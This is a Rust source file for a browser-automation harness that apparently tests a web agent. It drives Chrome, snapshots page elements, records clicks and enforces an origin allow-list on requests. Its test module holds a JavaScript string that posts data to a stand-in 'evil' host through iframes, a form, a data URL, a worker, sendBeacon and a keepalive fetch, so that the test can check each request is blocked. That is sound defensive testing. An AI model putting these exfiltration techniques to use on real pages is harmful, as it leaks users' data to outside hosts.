    pub async fn read(&self, reference: &str) -> Res<String> {
        let t = self.target(reference)?;
        let v = self.call_on(&t.place, &t.node, READ_FN, Vec::new()).await?;
        v.as_str()
            .map(squeeze)
            .ok_or_else(|| Fault::new("read", "not text"))
    }

    pub async fn file_sizes(&self, reference: &str) -> Res<Vec<u64>> {
        let t = self.target(reference)?;
        let v = self
            .call_on(
                &t.place,
                &t.node,
                "function () { return Array.from(this.files || []).map((f) => f.size); }",
                Vec::new(),
            )
            .await?;
        Ok(v.as_array()
            .map(|a| a.iter().filter_map(|n| n.as_u64()).collect())
            .unwrap_or_default())
    }

    /// Arms the request rule: from now on every request of the browser, of every target that it
    /// has and of every target that it opens later, before that target runs, is paused before it
    /// leaves and let through only when its origin is one of `allowed_origins` and, for a
    /// state-changing request, when `state_changing` is true; it is failed otherwise. `paused`
    /// returns each paused request with its outcome. Arming again replaces the rule and drops the
    /// paused requests of the earlier one.
    pub async fn arm_rule(
        &mut self,
        allowed_origins: Vec<String>,
        state_changing: bool,
    ) -> Res<()> {
        self.wire
            .arm_rule(wire::Rule {
                allowed: allowed_origins,
                state_changing,
            })
            .await
    }

    /// Runs a script of the trial in the page's own world of the main frame, through the debugging
    /// protocol, and returns its value. It is no operation of A11.1: the rows of A13.7 change the
    /// page with it.
    pub async fn run_page_script(&self, source: &str) -> Res<serde_json::Value> {
        let params = EvaluateParams::builder()
            .expression(source)
            .return_by_value(true)
            .build()
            .map_err(|e| Fault::new("script", e))?;
        let r = self.page.execute(params).await.map_err(cdp("script"))?;
        if r.result.exception_details.is_some() {
            return Err(Fault::new("script", "exception"));
        }
        Ok(r.result.result.value.unwrap_or(serde_json::Value::Null))
    }

    /// The frames that the browser runs as targets of their own, out of the process of the page
    /// that holds them: the id and the address of each target of type `iframe`.
    pub async fn frame_targets(&self) -> Res<Vec<(String, String)>> {
        let r = self
            .browser
            .execute(GetTargetsParams::default())
            .await
            .map_err(cdp("targets"))?;
        Ok(r.result
            .target_infos
            .into_iter()
            .filter(|t| t.r#type == "iframe")
            .map(|t| (t.target_id.inner().clone(), t.url))
            .collect())
    }

    pub fn paused(&self) -> Vec<PausedRequest> {
        self.wire.paused()
    }

    pub async fn add_recorder(&mut self) -> Res<()> {
        let mut events = self
            .page
            .event_listener::<EventBindingCalled>()
            .await
            .map_err(cdp("record"))?;
        let recorded = self.recorded.clone();
        self.recorder = Some(tokio::spawn(async move {
            while let Some(ev) = events.next().await {
                if ev.name == RECORD_BINDING {
                    if let Ok(mut r) = recorded.lock() {
                        r.push(ev.payload.clone());
                    }
                }
            }
        }));
        self.page
            .execute(AddBindingParams::new(RECORD_BINDING))
            .await
            .map_err(cdp("record"))?;
        self.page
            .execute(AddScriptToEvaluateOnNewDocumentParams::new(RECORDER_JS))
            .await
            .map_err(cdp("record"))?;
        Ok(())
    }

    pub fn recorded(&self) -> Vec<String> {
        self.recorded.lock().map(|r| r.clone()).unwrap_or_default()
    }
}

pub fn split_url(url: &str) -> (String, String) {
    let Some((scheme, rest)) = url.split_once("://") else {
        return (String::new(), url.to_string());
    };
    let end = rest.find(['/', '?', '#']).unwrap_or(rest.len());
    let origin = format!("{scheme}://{}", &rest[..end]);
    let tail = &rest[end..];
    let path_end = tail.find(['?', '#']).unwrap_or(tail.len());
    let path = if tail[..path_end].is_empty() {
        "/".to_string()
    } else {
        tail[..path_end].to_string()
    };
    (origin, path)
}

fn ax_text(v: &Option<chromiumoxide::cdp::browser_protocol::accessibility::AxValue>) -> String {
    match v.as_ref().and_then(|v| v.value.as_ref()) {
        Some(serde_json::Value::String(s)) => s.clone(),
        Some(serde_json::Value::Null) | None => String::new(),
        Some(other) => other.to_string(),
    }
}

pub fn squeeze(s: &str) -> String {
    s.split_whitespace().collect::<Vec<_>>().join(" ")
}

pub fn map_role(raw: &str) -> Option<&'static str> {
    Some(match raw {
        "button" => "button",
        "link" => "link",
        "textbox" | "searchbox" => "textbox",
        "checkbox" => "checkbox",
        "radio" => "radio",
        "combobox" => "combobox",
        "option" | "MenuListOption" => "option",
        "heading" => "heading",
        "cell" | "gridcell" => "cell",
        "listitem" => "listitem",
        "StaticText" => "text",
        "Iframe" | "IframePresentational" => "frame",
        _ => return None,
    })
}

const CONTROL_ROLES: [&str; 7] = [
    "button", "link", "textbox", "checkbox", "radio", "combobox", "option",
];
const VALUE_ROLES: [&str; 2] = ["textbox", "combobox"];
const MAX_FRAME_DEPTH: usize = 8;
const FRAME_CLICK_TRIES: usize = 3;

const PAINTED_JS: &str = "new Promise((done) => {
  setTimeout(() => done(false), 1000);
  requestAnimationFrame(() => requestAnimationFrame(() => done(true)));
})";

const MARK_CLICK_FN: &str = "function () {
  this.__halvoClickArrived = false;
  this.addEventListener('click', () => { this.__halvoClickArrived = true; }, { capture: true, once: true });
  return true;
}";

const READ_CLICK_FN: &str = "function () { return this.__halvoClickArrived === true; }";

const CONTENT_CORNER_FN: &str = "function () {
  const r = this.getBoundingClientRect();
  const s = getComputedStyle(this);
  return [r.left + this.clientLeft + parseFloat(s.paddingLeft), r.top + this.clientTop + parseFloat(s.paddingTop)];
}";

const CREDENTIAL_FN: &str = "function () {
  const type = (this.getAttribute('type') || '').toLowerCase();
  const auto = (this.getAttribute('autocomplete') || '').toLowerCase().split(/\\s+/);
  const secret = ['current-password', 'new-password', 'one-time-code'].some((t) => auto.includes(t));
  const input = this.tagName === 'INPUT' && (type === 'password' || secret);
  const captcha = this.parentElement !== null && this.parentElement.closest('[data-halvo-captcha]') !== null;
  return input || captcha;
}";

const SELECT_FN: &str = "function (label) {
  const option = Array.from(this.options || []).find((o) => o.text.trim() === label);
  if (!option) return false;
  this.value = option.value;
  this.dispatchEvent(new Event('input', { bubbles: true }));
  this.dispatchEvent(new Event('change', { bubbles: true }));
  return true;
}";

const READ_FN: &str = "function () {
  if (this.tagName === 'INPUT' || this.tagName === 'SELECT' || this.tagName === 'TEXTAREA') return String(this.value);
  return String(this.innerText || this.textContent || '');
}";

pub const RECORD_BINDING: &str = "halvoRecord";

const RECORDER_JS: &str = "(() => {
  const send = globalThis.halvoRecord;
  if (typeof send !== 'function') return;
  const describe = (el) => {
    const tag = (el.tagName || '').toLowerCase();
    const type = (el.getAttribute && el.getAttribute('type') || '').toLowerCase();
    const role = el.getAttribute && el.getAttribute('role') || (tag === 'a' ? 'link' : tag === 'button' ? 'button'
      : tag === 'select' ? 'combobox' : tag === 'input' && type === 'checkbox' ? 'checkbox'
      : tag === 'input' || tag === 'textarea' ? 'textbox' : tag);
    const label = el.labels && el.labels[0] ? el.labels[0].textContent : '';
    const name = (el.getAttribute && el.getAttribute('aria-label') || label || el.textContent || '').trim().replace(/\\s+/g, ' ');
    return { role, name, testid: el.getAttribute && el.getAttribute('data-testid') || '' };
  };
  const report = (kind) => (e) => {
    const el = e.target && e.target.closest ? e.target.closest('a,button,input,select,textarea,[role]') || e.target : e.target;
    if (!el) return;
    send(JSON.stringify(Object.assign({ kind }, describe(el))));
  };
  document.addEventListener('click', report('click'), true);
  document.addEventListener('input', report('input'), true);
})();";

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn start_refuses_a_used_profile_directory() {
        let profile =
            std::env::temp_dir().join(format!("r3-web-used-profile-{}", std::process::id()));
        std::fs::create_dir_all(&profile).unwrap();
        std::fs::write(profile.join("Local State"), b"{}").unwrap();
        let opts = StartOptions {
            browser: PathBuf::from("/nonexistent/chrome"),
            profile,
            headless: true,
            flags: Vec::new(),
            debug_port: None,
        };
        let refused = Executor::start(&opts).await.err();
        assert_eq!(
            refused.map(|f| f.1),
            Some("profile path exists".to_string())
        );
    }

    #[test]
    fn split_url_gives_origin_and_path() {
        assert_eq!(
            split_url("http://utility.agent.test:18090/prefs?x=1"),
            (
                "http://utility.agent.test:18090".to_string(),
                "/prefs".to_string()
            )
        );
        assert_eq!(
            split_url("http://pay.agent.test:18090"),
            ("http://pay.agent.test:18090".to_string(), "/".to_string())
        );
    }

    #[test]
    fn a_snapshot_line_quotes_and_marks() {
        let line = SnapshotLine {
            reference: "e7".into(),
            role: "textbox",
            name: "Say \"hi\"".into(),
            value: None,
            credential: true,
            frame: Some("http://pay.agent.test:18090".into()),
        };
        assert_eq!(
            line.render(),
            "e7 textbox \"Say ''hi''\" credential frame=http://pay.agent.test:18090"
        );
    }

    const WAYS_OUT: &str = r#"(() => {
  const E = 'http://evil.agent.test:PORT';
  const F = (p) => "fetch('" + E + p + "', {method: 'POST', body: 'x', mode: 'no-cors'})";
  const frame = (a) => { const i = document.createElement('iframe'); for (const k in a) i.setAttribute(k, a[k]); document.body.appendChild(i); };
  frame({sandbox: 'allow-scripts', srcdoc: '<script>' + F('/sbfetch') + '<\/script>'});
  frame({srcdoc: '<script>' + F('/plainfetch') + '<\/script>'});
  frame({sandbox: 'allow-scripts allow-forms', srcdoc: '<form method=post action="' + E + '/sbform"></form><script>document.forms[0].submit()<\/script>'});
  frame({src: 'data:text/html,<script>' + encodeURIComponent(F('/datafetch')) + '<\/script>'});
  new Worker(URL.createObjectURL(new Blob([F('/worker')])));
  navigator.sendBeacon(E + '/beacon', 'x');
  fetch(E + '/keepalive', {method: 'POST', body: 'x', mode: 'no-cors', keepalive: true}).catch(() => {});
  return true;
})()"#;

    #[tokio::test]
    #[ignore = "starts the browser that R3_TEST_BROWSER names and the fixture server; run with --ignored"]
    async fn the_armed_rule_fails_every_post_to_a_host_that_is_not_allowed() {
        let browser = std::env::var("R3_TEST_BROWSER")
            .expect("R3_TEST_BROWSER names the browser binary for the ignored tests");
        let repo = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../..");
        let server = crate::fixture::Server::start(
            &crate::fixture::fixture_program(&repo),
            &["--port".into(), "0".into()],
        )
        .expect("fixture");
        let port = server.port;
        let control = crate::fixture::Control { port };
        control.reset(&[]).expect("reset");
        let base = Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("target")
            .join("test-tmp");
        std::fs::create_dir_all(&base).expect("test-tmp");
        let mut flags: Vec<String> = crate::FIRST_FLAGS.iter().map(|f| f.to_string()).collect();
        flags.push(crate::RESOLVER_RULE.to_string());
        flags.push(crate::isolate_flag(port));
        let opts = StartOptions {
            browser: PathBuf::from(browser),
            profile: base.join(format!("rule-{}-{port}", std::process::id())),
            headless: true,
            flags,
            debug_port: None,
        };
        let mut ex = Executor::start(&opts).await.expect("start");
        let utility = crate::fixture::origin(crate::fixture::UTILITY, port);
        let steps = async {
            ex.open(&format!("{utility}/signin")).await?;
            ex.arm_rule(vec![utility.clone()], false).await?;
            ex.run_page_script(&WAYS_OUT.replace("PORT", &port.to_string()))
                .await?;
            tokio::time::sleep(Duration::from_secs(4)).await;
            Ok::<(Vec<PausedRequest>, Vec<String>), Fault>((ex.paused(), ex.attach_faults()))
        }
        .await;
        let state = control.state();
        ex.stop_and_remove().await;
        server.stop();
        let (paused, faults) = steps.expect("steps");
        let evil = crate::fixture::count(&state.expect("state"), &["requests", "evil"]);
        let failed: Vec<String> = paused
            .iter()
            .filter(|p| host_of(&p.origin) == "evil.agent.test" && p.outcome == Outcome::Failed)
            .map(|p| p.path.clone())
            .collect();
        assert_eq!(
            evil,
            Some(0),
            "requests.evil moved; failed: {failed:?}; faults: {faults:?}"
        );
        for path in [
            "/sbfetch",
            "/plainfetch",
            "/sbform",
            "/datafetch",
            "/worker",
            "/beacon",
            "/keepalive",
        ] {
            assert!(
                failed.iter().any(|f| f == path),
                "{path} was not failed: {failed:?}; faults: {faults:?}"
            );
        }
    }
}
